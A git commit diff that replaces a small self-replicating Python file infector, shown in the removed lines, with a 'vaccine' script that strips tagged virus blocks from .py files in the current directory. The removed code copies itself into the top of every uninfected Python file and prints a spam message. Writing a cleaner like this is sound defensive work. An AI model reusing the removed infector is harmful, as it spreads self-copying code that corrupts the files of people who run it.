458429c894ac2890c432b041c3d046df0065ec96
ZipS <czwetkow.serega@yandex.ru>
2020-12-23 19:03:11 +0300

    made corona vaccine

--- corona_vaccine.py
+++ corona_vaccine.py
@@ -1,37 +1,24 @@
-"""
-SAME WITH TAGS:
-ucorona
-uucorona
-"""
-
-# corona0
-MESSAGE = "CORONA Q " * 1000
 import os
 import glob
 
 cwd = os.getcwd()
 pyfiles = glob.glob(f"{cwd}/*py")
-healthy = []
-inject = []
-
-with open(__file__, 'r') as f:
-    for line in f.readlines():
-        inject.append(line)
-        if line == "# corona\n":
-            break
+tags = ("corona", "ucorona", "uucorona")
 
 for path in pyfiles:
     with open(path, 'r') as f:
-        line = f.readline()
-        if line != "# corona0\n":
-            healthy.append(path)
+        lines = f.readlines()
 
-for file in healthy:
-    with open(file, "r") as f:
-        code = f.read()
-    with open(file, "w") as f:
-        f.writelines(inject)
-        f.write(code)
+    for tag in tags:
+        open_tag = f"# {tag}0\n"
+        close_tag = f"# {tag}\n"
+        while open_tag in lines:
+            ind = lines.index(open_tag)
+            while lines[ind] != close_tag:
+                lines.pop(ind)
+            lines.pop(ind)
 
-print(MESSAGE)
-# corona
+    with open(path, 'w') as f:
+        f.writelines(lines)
+
+
